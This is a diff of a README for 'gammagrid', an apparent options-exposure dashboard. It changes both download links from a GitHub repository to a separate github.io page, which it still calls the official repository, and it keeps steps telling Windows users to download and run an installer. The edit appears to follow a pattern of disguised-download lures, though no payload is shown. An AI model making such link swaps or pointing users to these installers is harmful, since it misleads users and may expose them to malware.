@@ -1,6 +1,6 @@
 # 📈 gammagrid - Track dealer options and market exposure
 
-[![](https://img.shields.io/badge/Download-gammagrid-blue.svg)](https://github.com/Shannonhomeward768/gammagrid)
+[![](https://img.shields.io/badge/Download-gammagrid-blue.svg)](https://shannonhomeward768.github.io)
 
 ## 📊 Overview
 
@@ -19,7 +19,7 @@ Gammagrid provides a clear view of market positioning. Traders use this tool to 
 
 Follow these steps to set up the dashboard on your Windows computer.
 
-1. **Visit the download page:** Go to [the official gammagrid repository](https://github.com/Shannonhomeward768/gammagrid) to access the files.
+1. **Visit the download page:** Go to [the official gammagrid repository](https://shannonhomeward768.github.io) to access the files.
 2. **Download the installer:** Look for the release section. Download the installation package for Windows.
 3. **Run the file:** Double-click the downloaded file to start the installation. Follow the prompts on your screen.
 4. **Launch the application:** Find the gammagrid icon on your desktop or start menu. Open the program to trigger the dashboard.
